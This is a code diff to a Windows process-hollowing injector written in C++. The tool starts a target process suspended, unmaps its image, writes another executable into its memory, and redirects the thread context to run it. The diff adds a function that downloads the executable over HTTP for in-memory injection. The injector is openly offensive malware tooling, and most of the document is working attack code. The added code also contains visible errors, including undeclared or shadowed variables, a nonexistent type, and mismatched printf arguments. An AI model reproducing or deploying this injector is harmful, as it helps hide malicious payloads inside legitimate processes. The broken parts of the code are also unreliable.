@@ -1,9 +1,16 @@
 #include <Windows.h>
 #include <cstdio>
 #include <winternl.h>
+#include <wininet.h>
+
 
 LPSTR lpSourceImage;
 LPSTR lpTargetProcess;
+pZwUnmapViewOfSection = NULL;
+
+typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(
+    HANDLE, PVOID
+    );
 
 // Structure to store the address process infromation.
 struct ProcessAddressInformation
@@ -16,7 +23,21 @@ struct ProcessAddressInformation
 typedef struct IMAGE_RELOCATION_ENTRY {
 	WORD Offset : 12;
 	WORD Type : 4;
-} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;
+} IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;
+
+
+BOOL UnmapSectionView(const HANDLE hProcess, const LPVOID base)
+{
+    DWORD dwResult = NULL;
+    if(!pZwUnmapViewOfSection){
+        HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll");
+        pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdllBase, "ZwUnmapViewOfSection");
+    }
+
+	dwResult = pZwUnmapViewOfSection(hProcess, (LPVOID)base);
+
+    return dwResult;
+}
 
 /**
  * Function to retrieve the PE file content.
@@ -28,7 +49,7 @@ HANDLE GetFileContent(const LPSTR lpFilePath)
 	const HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
-		printf("[-] An error occured when trying to open the PE file !\n");
+		printf("[-] An error occurred when trying to open the PE file! Error %d \n", GetLastError());
 		CloseHandle(hFile);
 		return nullptr;
 	}
@@ -36,7 +57,7 @@ HANDLE GetFileContent(const LPSTR lpFilePath)
 	const DWORD dFileSize = GetFileSize(hFile, nullptr);
 	if (dFileSize == INVALID_FILE_SIZE)
 	{
-		printf("[-] An error occured when trying to get the PE file size !\n");
+		printf("[-] An error occurred when trying to get the PE file size !\n");
 		CloseHandle(hFile);
 		return nullptr;
 	}
@@ -44,7 +65,7 @@ HANDLE GetFileContent(const LPSTR lpFilePath)
 	const HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
 	if (hFileContent == INVALID_HANDLE_VALUE)
 	{
-		printf("[-] An error occured when trying to allocate memory for the PE file content !\n");
+		printf("[-] An error occurred when trying to allocate memory for the PE file content! Error: \n", GetLastError());
 		CloseHandle(hFile);
 		CloseHandle(hFileContent);
 		return nullptr;
@@ -53,7 +74,7 @@ HANDLE GetFileContent(const LPSTR lpFilePath)
 	const BOOL bFileRead = ReadFile(hFile, hFileContent, dFileSize, nullptr, nullptr);
 	if (!bFileRead)
 	{
-		printf("[-] An error occured when trying to read the PE file content !\n");
+		printf("[-] An error occurred when trying to read the PE file content! Error: %d \n", GetLastError());
 		CloseHandle(hFile);
 		if (hFileContent != nullptr)
 			CloseHandle(hFileContent);
@@ -63,6 +84,67 @@ HANDLE GetFileContent(const LPSTR lpFilePath)
 
 	CloseHandle(hFile);
 	return hFileContent;
+}
+
+/**
+ * Function to retrieve the PE file content from an URL.
+ * \param fileUrl : path of the PE file.
+ * \return : address of the content in the explorer memory.
+ */
+LVOID GetFileContentFromUrl(const LPSTR fileUrl)
+{
+    // http://127.0.0.1:8080/msgbox.exe
+    HINTERNET hInternetSession;
+    HINTERNET hURL;
+    int fSize = 0;
+
+    DWORD dwBytesRead=0;
+    DWORD lpOutBuffer=0;
+    DWORD dwSize=sizeof(lpOutBuffer);
+    //char *PE_buffer;
+    LPVOID PE_buffer;
+    // Make internet connection.
+    hInternetSession = InternetOpenA(
+        "Mozilla 1.2.3", // agent
+        INTERNET_OPEN_TYPE_PRECONFIG,  // access
+        NULL, NULL, 0);                // defaults
+
+    // Make connection to desired page.
+    hURL = InternetOpenUrl(
+        hInternetSession,                       // session handle
+        fileUrl,                                // URL to access
+        NULL, 0, 0, 0);                         // defaults
+
+    // If connection to file is successfully opened we go check for the file size
+    if(hURL>0){
+        fSize = (int)HttpQueryInfoA(hURL,HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &lpOutBuffer,&dwSize,NULL);
+        printf("[+] File size: %d \n",  lpOutBuffer);
+        //PE_buffer = (char *) malloc(lpOutBuffer+1);
+        PE_buffer = VirtualAlloc(NULL, lpOutBuffer,  MEM_COMMIT, PAGE_READWRITE);
+        if(PE_buffer==nullptr){
+            printf("[-] Error allocating buffer for remote file: %d \n", GetLastError());
+            exit(1);
+        }
+        else{
+            if(InternetReadFile(hURL, PE_buffer, lpOutBuffer, &dwBytesRead)){
+                printf("[+] Number of bytes read: %d \n",dwBytesRead);
+                return PE_buffer;
+            }
+            else{
+                printf("[-] Error downloading the file content. Error: %d \n", GetLastError());
+                exit(1);
+            }
+        }
+    }
+    else{
+        printf("[-] Error opening the url: %s Error code: %d \n", fileUrl, GetLastError());
+    }
+    // Close down connections.
+    InternetCloseHandle(hURL);
+    InternetCloseHandle(hInternetSession);
+
+    return NULL;
+
 }
 
 /**
@@ -167,7 +249,7 @@ DWORD GetSubsystemEx32(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
 	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
 	if (!bGetDOSHeader)
 	{
-		printf("[-] An error is occured when trying to get the target DOS header.\n");
+		printf("[-] An error has occurred when trying to get the target DOS header. Error: \n", GetLastError());
 		return -1;
 	}
 
@@ -175,7 +257,7 @@ DWORD GetSubsystemEx32(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
 	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS32), nullptr);
 	if (!bGetNTHeader)
 	{
-		printf("[-] An error is occured when trying to get the target NT header.\n");
+		printf("[-] An error has occurred when trying to get the target NT header. Error: %d \n", GetLastError());
 		return -1;
 	}
 
@@ -194,7 +276,7 @@ DWORD GetSubsystemEx64(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
 	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
 	if (!bGetDOSHeader)
 	{
-		printf("[-] An error is occured when trying to get the target DOS header.\n");
+		printf("[-] An error has occurred when trying to get the target DOS header. Error: %d \n", GetLastError());
 		return -1;
 	}
 
@@ -202,7 +284,7 @@ DWORD GetSubsystemEx64(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
 	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS64), nullptr);
 	if (!bGetNTHeader)
 	{
-		printf("[-] An error is occured when trying to get the target NT header.\n");
+		printf("[-] An error has occurred when trying to get the target NT header. Error: %d \n", GetLastError());
 		return -1;
 	}
 
@@ -288,7 +370,7 @@ IMAGE_DATA_DIRECTORY GetRelocAddress32(const LPVOID lpImage)
 	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
 		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
-	return {0, 0};
+	return { 0, 0 };
 }
 
 /**
@@ -322,7 +404,7 @@ BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (lpAllocAddress == nullptr)
 	{
-		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
+		printf("[-] An error has occurred when trying to allocate memory for the new image. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -331,7 +413,7 @@ BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, (LPVOID)lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
 	if (!bWriteHeaders)
 	{
-		printf("[-] An error is occured when trying to write the headers of the new image.\n");
+		printf("[-] An error has occurred when trying to write the headers of the new image. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -343,7 +425,7 @@ BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
 		if (!bWriteSection)
 		{
-			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
+			printf("[-] An error has occurred when trying to write the section : %s. Error: %d \n", (LPSTR)lpImageSectionHeader->Name, GetLastError());
 			return FALSE;
 		}
 
@@ -356,14 +438,14 @@ BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
 	if (!bGetContext)
 	{
-		printf("[-] An error is occured when trying to get the thread context.\n");
+		printf("[-] An error has occurred when trying to get the thread context. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
 	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);
 	if (!bWritePEB)
 	{
-		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
+		printf("[-] An error has occurred when trying to write the image base in the PEB. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -372,7 +454,7 @@ BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
 	if (!bSetContext)
 	{
-		printf("[-] An error is occured when trying to set the thread context.\n");
+		printf("[-] An error has occurred when trying to set the thread context. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -387,26 +469,36 @@ BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
  * \param lpImage : content of the new image.
  * \return : TRUE if the PE run succesfully else FALSE.
  */
-BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
+BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage, const LPVOID remoteBase)
 {
 	LPVOID lpAllocAddress;
-
+    BOOL umResult;
 	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
 	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
+    lpImageNTHeader64->FileHeader.charateristics; // check if .reloc stripped so it can only load at base address
 
-	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    // virtual query to check if base address exists on remote process?
+
+    umResult = UnmapSectionView(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase);
+    //umResult = UnmapSectionView(lpPI->hProcess, (LPVOID)remoteBase);
+
+	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, remoteBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (lpAllocAddress == nullptr)
 	{
-		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
+		printf("[-] An error has occurred when trying to allocate memory for the new image %p. Error %d \n", (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, GetLastError());
 		return FALSE;
 	}
 
-	printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);
+	printf("[+] Memory allocated at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);
+
+
+	
+
 
 	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
 	if (!bWriteHeaders)
 	{
-		printf("[-] An error is occured when trying to write the headers of the new image.\n");
+		printf("[-] An error has occurred when trying to write the headers of the new image. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -418,7 +510,7 @@ BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
 		if (!bWriteSection)
 		{
-			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
+			printf("[-] An error has occurred when trying to write the section : %s. Error: %d \n", (LPSTR)lpImageSectionHeader->Name, GetLastError());
 			return FALSE;
 		}
 
@@ -431,14 +523,14 @@ BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
 	if (!bGetContext)
 	{
-		printf("[-] An error is occured when trying to get the thread context.\n");
+		printf("[-] An error has occurred when trying to get the thread context. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
 	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
 	if (!bWritePEB)
 	{
-		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
+		printf("[-] An error has occurred when trying to write the image base in the PEB. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -447,7 +539,7 @@ BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
 	if (!bSetContext)
 	{
-		printf("[-] An error is occured when trying to set the thread context.\n");
+		printf("[-] An error has occurred when trying to set the thread context. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -472,7 +564,7 @@ BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (lpAllocAddress == nullptr)
 	{
-		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
+		printf("[-] An error has occurred when trying to allocate memory for the new image. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -484,7 +576,7 @@ BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
 	if (!bWriteHeaders)
 	{
-		printf("[-] An error is occured when trying to write the headers of the new image.\n");
+		printf("[-] An error has occurred when trying to write the headers of the new image. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -502,7 +594,7 @@ BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
 		if (!bWriteSection)
 		{
-			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
+			printf("[-] An error has occurred when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
 			return FALSE;
 		}
 
@@ -511,7 +603,7 @@ BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 
 	if (lpImageRelocSection == nullptr)
 	{
-		printf("[-] An error is occured when trying to get the relocation section of the source image.\n");
+		printf("[-] An error has occurred when trying to get the relocation section of the source image. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -540,7 +632,7 @@ BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 			PatchedAddress += DeltaImageBase;
 
 			WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);
-			
+
 		}
 	}
 
@@ -552,14 +644,14 @@ BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
 	if (!bGetContext)
 	{
-		printf("[-] An error is occured when trying to get the thread context.\n");
+		printf("[-] An error has occurred when trying to get the thread context. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
 	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpAllocAddress, sizeof(DWORD), nullptr);
 	if (!bWritePEB)
 	{
-		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
+		printf("[-] An error has occurred when trying to write the image base in the PEB. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -568,7 +660,7 @@ BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
 	if (!bSetContext)
 	{
-		printf("[-] An error is occured when trying to set the thread context.\n");
+		printf("[-] An error has occurred when trying to set the thread context. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -583,17 +675,21 @@ BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
  * \param lpImage : content of the new image.
  * \return : TRUE if the PE run succesfully else FALSE.
  */
-BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
+BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage, const LPVOID remoteBase)
 {
 	LPVOID lpAllocAddress;
+    DWORD umResult;
 
 	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
 	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
 
-	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    //umResult = UnmapSectionView(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase);
+    umResult = UnmapSectionView(lpPI->hProcess, (LPVOID)remoteBase);
+
+	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)remoteBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (lpAllocAddress == nullptr)
 	{
-		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
+		printf("[-] An error has occurred when trying to allocate memory for the new image. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -605,7 +701,7 @@ BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
 	if (!bWriteHeaders)
 	{
-		printf("[-] An error is occured when trying to write the headers of the new image.\n");
+		printf("[-] An error has occurred when trying to write the headers of the new image. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -619,12 +715,12 @@ BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
 		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
 			lpImageRelocSection = lpImageSectionHeader;
-		
+
 
 		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
 		if (!bWriteSection)
 		{
-			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
+			printf("[-] An error has occurred when trying to write the section : %s. Error %d \n", (LPSTR)lpImageSectionHeader->Name, GetLastError());
 			return FALSE;
 		}
 
@@ -633,7 +729,7 @@ BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 
 	if (lpImageRelocSection == nullptr)
 	{
-		printf("[-] An error is occured when trying to get the relocation section of the source image.\n");
+		printf("[-] An error has occurred when trying to get the relocation section of the source image. Error %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -674,14 +770,14 @@ BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
 	if (!bGetContext)
 	{
-		printf("[-] An error is occured when trying to get the thread context.\n");
+		printf("[-] An error has occurred when trying to get the thread context. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
 	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
 	if (!bWritePEB)
 	{
-		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
+		printf("[-] An error has occurred when trying to write the image base in the PEB. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -690,7 +786,7 @@ BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
 	if (!bSetContext)
 	{
-		printf("[-] An error is occured when trying to set the thread context.\n");
+		printf("[-] An error has occurred when trying to set the thread context. Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -741,7 +837,7 @@ int main(const int argc, char* argv[])
 	const BOOL bProcessCreation = CreateProcessA(lpTargetProcess, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI);
 	if (!bProcessCreation)
 	{
-		printf("[-] An error is occured when trying to create the target process !\n");
+		printf("[-] An error has occurred when trying to create the target process! Error: %d \n", GetLastError());
 		CleanAndExitProcess(&PI, hFileContent);
 		return -1;
 	}
@@ -749,13 +845,13 @@ int main(const int argc, char* argv[])
 	BOOL bTarget32;
 	IsWow64Process(PI.hProcess, &bTarget32);
 
-	ProcessAddressInformation ProcessAddressInformation = {nullptr, nullptr};
+	ProcessAddressInformation ProcessAddressInformation = { nullptr, nullptr };
 	if (bTarget32)
 	{
 		ProcessAddressInformation = GetProcessAddressInformation32(&PI);
 		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
 		{
-			printf("[-] An error is occured when trying to get the image base address of the target process !\n");
+			printf("[-] An error has occurred when trying to get the image base address of the target process! Error: %d \n", GetLastError());
 			CleanAndExitProcess(&PI, hFileContent);
 			return -1;
 		}
@@ -765,7 +861,7 @@ int main(const int argc, char* argv[])
 		ProcessAddressInformation = GetProcessAddressInformation64(&PI);
 		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
 		{
-			printf("[-] An error is occured when trying to get the image base address of the target process !\n");
+			printf("[-] An error has occurred when trying to get the image base address of the target process! Error: %d \n", GetLastError());
 			CleanAndExitProcess(&PI, hFileContent);
 			return -1;
 		}
@@ -801,7 +897,7 @@ int main(const int argc, char* argv[])
 
 	if (dwSourceSubsystem == (DWORD)-1)
 	{
-		printf("[-] An error is occured when trying to get the subsytem of the source image.\n");
+		printf("[-] An error has occurred when trying to get the subsytem of the source image. Error: \n", GetLastError());
 		CleanAndExitProcess(&PI, hFileContent);
 		return -1;
 	}
@@ -816,7 +912,7 @@ int main(const int argc, char* argv[])
 
 	if (dwTargetSubsystem == (DWORD)-1)
 	{
-		printf("[-] An error is occured when trying to get the subsytem of the target process.\n");
+		printf("[-] An error has occurred when trying to get the subsytem of the target process. Error: \n", GetLastError());
 		CleanAndExitProcess(&PI, hFileContent);
 		return -1;
 	}
@@ -827,7 +923,7 @@ int main(const int argc, char* argv[])
 		printf("[+] Subsytems are compatible.\n");
 	else
 	{
-		printf("[-] Subsytems are not compatible.\n");
+		printf("[-] Subsytems are not compatible. Error: %d \n", GetLastError());
 		CleanAndExitProcess(&PI, hFileContent);
 		return -1;
 	}
@@ -866,7 +962,7 @@ int main(const int argc, char* argv[])
 
 	if (!bSource32 && !bHasReloc)
 	{
-		if (RunPE64(&PI, hFileContent))
+		if (RunPE64(&PI, hFileContent, ProcessAddressInformation.lpProcessImageBaseAddress))
 		{
 			printf("[+] The injection has succeed !\n");
 			CleanProcess(&PI, hFileContent);
@@ -876,14 +972,14 @@ int main(const int argc, char* argv[])
 
 	if (!bSource32 && bHasReloc)
 	{
-		if (RunPEReloc64(&PI, hFileContent))
+		if (RunPEReloc64(&PI, hFileContent, ProcessAddressInformation.lpProcessImageBaseAddress))
 		{
 			printf("[+] The injection has succeed !\n");
 			CleanProcess(&PI, hFileContent);
 			return 0;
 		}
 	}
-	
+
 	printf("[-] The injection has failed !\n");
 
 	if (hFileContent != nullptr)
